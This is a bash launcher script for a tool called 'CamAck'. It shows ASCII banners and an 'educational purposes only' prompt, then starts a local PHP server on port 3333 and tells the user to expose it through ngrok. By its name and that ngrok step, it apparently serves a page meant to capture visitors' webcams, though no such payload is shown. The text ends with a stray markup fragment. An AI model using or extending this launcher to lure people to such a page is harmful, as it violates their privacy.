#!/bin/bash
# CamAck Server Script

clear
printf "\n"
printf "\n"
printf "\n"
echo '
                              mmmm
                        so++++oooooo++++osydmM
                   +ooyhdmNNNNNNNNNNNNmmhyoo++oy
               +oydmNMMMNmdhyysoooosyyhdmNMMMNmdyo++
           +ymNMMMMMds/-.`            `.-/sdMMMMMNmy+
         +dNMNmmMNy:.                      .:yNMmmNMNd+
         /hNNMddNMd:..                        ..:dMNddMNNh/
        +mNdNdmMMd.-.                          .-.dMMmdNdNm+
       NNhNNdMMM:--`        CAMACK TOOL       --:MMMdNNyNN/
      mMsdMhNMMd.--                            --.dMMNhMdsMm:
     yMhoNMdMMMh-:-`                          `-:-hMMMdMNohMy:
     NN/hMMMMMMmshhhy+`                    `+yhhhsmMMMMMMh/NN//
    yMmdMNMMMMMMNy:----                    ----:yNMMMMMMNMdmMy-
    NMMNhyMNMMMN/`:shdds:`              `:sddhs:`/NMMMNMyhNMMN//
  +MNmMdsyMdMMM+`+hMMMMMMd+.  `-  -`  .+dMMMMMMh+`+MMMdMysdMmNM+:
  hMydMd:/MhMMM``.hMMMMMMMMNdyym``myydNMMMMMMMMh.``MMMhM/:dMdyMh-
  dMssMd++MhMMM/ `dyMMMNITIMMMMMMM::::MM NITIMMMyd` /MMMhM++dMssMd-
  dMdNMdmNMhNMMMo.:ssMMMMMMMMMy:MM:yMMMMMMMMMss:.oMMMNhMNmdMNdMd-
  hMdMMmmMMddMMd   `./ydmmdmMs.mMMm.sMmdmmdy/.`   yMMddMMmmMMdMh-
  sMmmMNdMMNhMM:`     `..-+/.:mMddMm:.//-..`     `:MMhNMMdNMmmMs-
    MMMMyNMMhMMs-`         ``+NN::NN+``         `-sMMhMMNyMMMMm//
       MMNmMMMMMdo:/osys:     `.--.`     :syso/:odMMMMMmmMMds+/
         shdmNMMMMMNMMMmmd/      ``      /dmmMMMNMMMMMNmNhy//
             :mMMmMMy:-`                `-:yMMmMMm://:dh+:
               hMMhNMdo.+-..`` ```` ``..-+.odMNhMMh-yy-dh+:
               yMModdM. y`-s`:y.//.y:`s-`y -MddoMMy-h+:Nh:+
                yMM/ooMmdd/oo :o -- o: oo/ddmMoo/MMy-+:hms:
                hMM:.-oNdhNmNdmh/ss/hmdNmNhdNo-.:MMh-/hms:
                MM:. /+`h.h:/camack/:h.h`+/`-:/MMdymd+/
                   Mh/`  ..+.h.-y // y-.h.+..-hhNNMNdh+/
                   Nh+-`  `..-+.//.+-..`  `/dmMMMo/  
                      h+-``          ``-+hmNhyy+/  
                     smNmh+-````````-+hmNms++yh  
                       hdsmyo+oo+oymuwqmkdwa     
                             NNNNNNNN 
                  ---------------------------------  
                 !!        CAMACK TOOL             !! 
                  ---------------------------------                  ' | lolcat
sleep 5
clear
echo "                YOU NEED TO SETUP NGROK FOR EXTERNAL ACCESS 
               OTHERWISE YOU WILL ONLY GET LOCAL ACCESS...!"
sleep 3
clear
read -p $'EDUCATIONAL PURPOSES ONLY ? \e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m (Y/N) : \e[0m' option
echo ""
clear

if [[ $option == *'N'* ]] || [[ $option == *'n'* ]] || [[ $option == *'No'* ]] || [[ $option == *'nO'* ]] || [[ $option == *'no'* ]] || [[ $option == *'NO'* ]]; then
clear
exit
fi

trap 'printf "\n";stop' 2

banner() {
echo '
           ___        .---------.._
    ______!gnm!_....-" .g8888888p. "-------....._
  ."          //     .g8:       :8p..---....___ \".
  | CAMACK   //  ()  d88:       :88b|==========! !|
  |  V1.0   //       888:       :888|==========| !|
  |___      \\_______"T88888888888P""----------"//|   
  |   \       """"""""""""""""""""""""""""""""""/ |   
  |    !...._____      .="""=.   .[]    ____...!  |   
  |   / This Tool     ! .g$p. !   .[]          :  |   
  |  ! Has Been      :  $$$$$  :  .[]          :  |   
  |  !    Modified    ! "T$P" !   .[]           . |   
  |   \__              "=._.="   .()        __    |   
  |.--'"'"'  '"'"'----._______________________.----'"'"'  '"'"'--.|
  ".__CAMACK_TOOL_MODIFIED_FOR_FIREBASE___________." ' | lolcat

echo " "
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]Tool link  :\e[0m\e[1;77m %s\e[0m\n https://www.github.com/CamAckTeam/CamAck"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]Support    :\e[0m\e[1;77m %s\e[0m\n https://camackteam.com"
printf "\n"
}

stop() {
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

server_start() {
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !   PHP SERVER NOW STARTING   !  \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
echo ""
php -S localhost:3333 > /dev/null 2>&1 & 
sleep 2
echo "Localhost: http://127.0.0.1:3333"
echo ""
echo "You have to start ngrok manually on port 3333 for external access"
echo ""
echo "Visit http://127.0.0.1:3333 in your browser to use CamAck"
echo ""
echo "Press Ctrl+C to stop the server"
wait
}

start_menu() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Localhost\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option [DEFAULT IS 1]: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

if [[ $option_server -eq 1 ]]; then
server_start
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start_menu
fi
}

banner
dependencies
start_menu
```](streamdown:incomplete-link)
